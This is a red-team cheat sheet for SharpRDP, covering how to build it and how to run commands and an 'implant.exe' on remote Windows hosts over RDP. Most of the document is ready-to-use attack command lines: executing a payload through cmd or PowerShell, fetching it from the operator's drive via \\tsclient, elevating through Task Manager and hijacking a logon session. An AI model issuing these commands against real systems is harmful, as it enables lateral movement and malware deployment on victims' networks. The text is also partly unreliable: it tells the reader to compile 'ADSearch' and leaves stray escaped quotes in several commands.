# SharpRDP

## 01 - Compile

Install a targeting pack from this [link](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481).  Then compile `ADSearch`.

```
C:\> git clone https://github.com/0xthirteen/SharpRDP

C:\> cd SharpRDP

C:\SharpRDP> dotnet build -c Release -p:TargetFrameworkVersion=v4.8.1
```

## 02 - Usage

Regular RDP connection and execution

```
C:\> .\SharpRDP.exe computername=<IP> [username=<domain>\<username> password=<password>] command="<commands>"
```

`exec` program as child process of `cmd` or `powershell`.

```
C:\> .\SharpRDP.exe computername=<IP> [username=<domain>\<username> password=<password>] command="C:\Temp\implant.exe" exec=cmd
```

Connect first host drives

```
C:\> .\SharpRDP.exe computername=<IP> [username=<domain>\<username> password=<password>] command="\\tsclient\C\Temp\implant.exe" connectdrive=true
```

Execute command elevated through task manager.

```
C:\> .\SharpRDP.exe computername=<IP> [username=<domain>\<username> password=<password>] command="C:\Temp\implant.exe\" elevated=taskmgr
```

Add Network Level Authentication

```
C:\> .\SharpRDP.exe computername=<IP> [username=<domain>\<username> password=<password>] command="C:\Temp\implant.exe\" nla=true
```

Ask to take over logon session.

```
C:\> .\SharpRDP.exe computername=<IP> [username=<domain>\<username> password=<password>] command="C:\Temp\implant.exe\" takeover=true
```

---
## References

- [SharpRDP](https://github.com/0xthirteen/SharpRDP)

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)